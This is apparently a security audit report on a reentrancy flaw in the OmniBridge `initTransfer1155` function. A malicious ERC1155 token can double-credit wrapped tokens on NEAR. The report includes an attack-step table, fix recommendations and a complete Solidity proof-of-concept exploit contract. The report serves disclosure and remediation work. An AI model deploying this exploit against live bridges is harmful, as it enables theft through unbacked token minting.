### Title
Reentrancy in `initTransfer1155` via Malicious ERC1155 Token Enables Double-Credit on NEAR — (File: evm/src/omni-bridge/contracts/OmniBridge.sol)

---

### Summary

`OmniBridge.initTransfer1155` increments `currentOriginNonce` and then makes an external call to an attacker-controlled ERC1155 token's `safeTransferFrom`. Because no reentrancy guard exists, a malicious ERC1155 token can reenter `initTransfer1155` during that external call, causing two distinct `InitTransfer` events to be emitted (with different nonces) while only one actual token transfer occurs. NEAR processes both events independently, granting the attacker double the wrapped tokens for a single deposit.

---

### Finding Description

`initTransfer1155` follows this sequence:

1. **Increment nonce** — `currentOriginNonce += 1` (line 448)
2. **External call** — `IERC1155(tokenAddress).safeTransferFrom(msg.sender, address(this), tokenId, amount, "")` (line 458)
3. **Extension hook** — `initTransferExtension(...)` (line 468)
4. **Emit event** — `emit BridgeTypes.InitTransfer(...)` (line 480) [1](#0-0) 

The contract accepts **any** `tokenAddress` supplied by the caller. There is no whitelist and no `ReentrancyGuard` or `nonReentrant` modifier anywhere in `OmniBridge`. [2](#0-1) 

The ERC1155 `safeTransferFrom` standard mandates that the token contract invoke `onERC1155Received` on the recipient. A malicious token's `safeTransferFrom` implementation can, before completing the transfer, call back into `initTransfer1155` directly. Because `currentOriginNonce` was already incremented to `N` in the outer call, the reentrant call increments it to `N+1` and proceeds independently.

OmniBridge's `onERC1155Received` contains a guard:

```solidity
if (operator != address(this)) {
    revert ERC1155DirectSendNotAllowed();
}
``` [3](#0-2) 

However, the malicious token controls what value it passes as `operator` when it calls `onERC1155Received`. It can trivially pass `address(this)` (OmniBridge's own address) to satisfy the check, since the function is `external view` and performs no cryptographic binding to the actual caller context.

**Attack sequence:**

| Step | Actor | Action | State |
|------|-------|--------|-------|
| 1 | Attacker | Calls `initTransfer1155(maliciousToken, id, amount, 0, 0, nearRecipient, "")` | nonce → N |
| 2 | OmniBridge | Calls `maliciousToken.safeTransferFrom(attacker, bridge, id, amount, "")` | nonce = N |
| 3 | MaliciousToken | Reenters `initTransfer1155(maliciousToken, id, amount, 0, 0, nearRecipient, "")` | nonce → N+1 |
| 4 | OmniBridge | Calls `maliciousToken.safeTransferFrom(maliciousToken, bridge, id, amount, "")` | — |
| 5 | MaliciousToken | Actually transfers `amount` tokens to bridge; calls `onERC1155Received(bridge, ...)` | tokens received |
| 6 | OmniBridge | Emits `InitTransfer` with nonce N+1; returns | — |
| 7 | MaliciousToken | Returns from outer `safeTransferFrom` **without** transferring tokens; calls `onERC1155Received(bridge, ...)` | no new tokens |
| 8 | OmniBridge | Emits `InitTransfer` with nonce N | — |

Result: bridge holds `amount` tokens; two `InitTransfer` events emitted for nonces N and N+1, each claiming `amount` tokens locked.

---

### Impact Explanation

NEAR's bridge contract processes `InitTransfer` events keyed by `(originChain, originNonce)`. Both nonces (N and N+1) are distinct and valid, so NEAR mints `amount` wrapped tokens for each event — `2 × amount` total — against only `amount` tokens actually locked on EVM. This directly produces **unbacked wrapped-token supply**, satisfying the High impact criterion: *"Replayable, non-unique, or duplicate cross-chain settlement… that produces double-credit or unbacked supply."*

---

### Likelihood Explanation

- Deploying a malicious ERC1155 token is **permissionless** — no admin role or privileged access required.
- `initTransfer1155` accepts **any** `tokenAddress` with no whitelist.
- The `onERC1155Received` operator check is trivially bypassed by the malicious token passing `address(this)` as the operator argument.
- The attack requires a single transaction and is fully self-contained.

Likelihood: **High**.

---

### Recommendation

1. Add OpenZeppelin's `ReentrancyGuardUpgradeable` to `OmniBridge` and apply `nonReentrant` to `initTransfer`, `initTransfer1155`, and `finTransfer`.
2. Follow strict checks-effects-interactions: emit the `InitTransfer` event and call `initTransferExtension` **before** the external `safeTransferFrom` call, or alternatively record the nonce in a per-call mapping before any external interaction.
3. Consider maintaining a token allowlist for ERC1155 tokens accepted by `initTransfer1155`, so only vetted contracts can trigger the ERC1155 callback path.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "@openzeppelin/contracts/token/ERC1155/IERC1155Receiver.sol";

interface IOmniBridge {
    function initTransfer1155(
        address tokenAddress,
        uint256 tokenId,
        uint128 amount,
        uint128 fee,
        uint128 nativeFee,
        string calldata recipient,
        string calldata message
    ) external payable;
}

contract MaliciousERC1155 {
    IOmniBridge public bridge;
    address public attacker;
    bool public reentered;

    uint256 constant TOKEN_ID = 1;
    uint128 constant AMOUNT = 1000;
    mapping(address => mapping(uint256 => uint256)) public balanceOf;

    constructor(address _bridge) {
        bridge = IOmniBridge(_bridge);
        attacker = msg.sender;
        // Give this contract tokens for the reentrant call
        balanceOf[address(this)][TOKEN_ID] = AMOUNT;
    }

    function attack(string calldata nearRecipient) external payable {
        // Outer call: attacker initiates transfer
        bridge.initTransfer1155{value: msg.value}(
            address(this), TOKEN_ID, AMOUNT, 0, 0, nearRecipient, ""
        );
    }

    // Called by OmniBridge during initTransfer1155
    function safeTransferFrom(
        address from,
        address to,
        uint256 id,
        uint256 amount,
        bytes calldata
    ) external {
        if (!reentered) {
            reentered = true;
            // Reenter: msg.sender here is OmniBridge, so this contract is msg.sender in reentrant call
            bridge.initTransfer1155(
                address(this), TOKEN_ID, AMOUNT, 0, 0, "nearRecipient.near", ""
            );
            // Reentrant call completed: nonce N+1 event emitted, tokens transferred from this contract
            // Now return WITHOUT transferring tokens for the outer call
            // Call onERC1155Received with operator = bridge (address(this) from bridge's perspective)
            IERC1155Receiver(to).onERC1155Received(
                address(bridge), // operator = bridge address, passes the check
                from, id, amount, ""
            );
        } else {
            // Reentrant call: actually transfer tokens
            balanceOf[from][id] -= amount;
            balanceOf[to][id] += amount;
            IERC1155Receiver(to).onERC1155Received(
                address(bridge), from, id, amount, ""
            );
        }
    }

    function isApprovedForAll(address, address) external pure returns (bool) {
        return true;
    }
}
```

After `attack()` completes:
- OmniBridge emits `InitTransfer` for nonce N (outer call, 0 tokens actually transferred)
- OmniBridge emits `InitTransfer` for nonce N+1 (reentrant call, `AMOUNT` tokens transferred)
- Bridge holds `AMOUNT` tokens; NEAR mints `2 × AMOUNT` wrapped tokens. [4](#0-3)
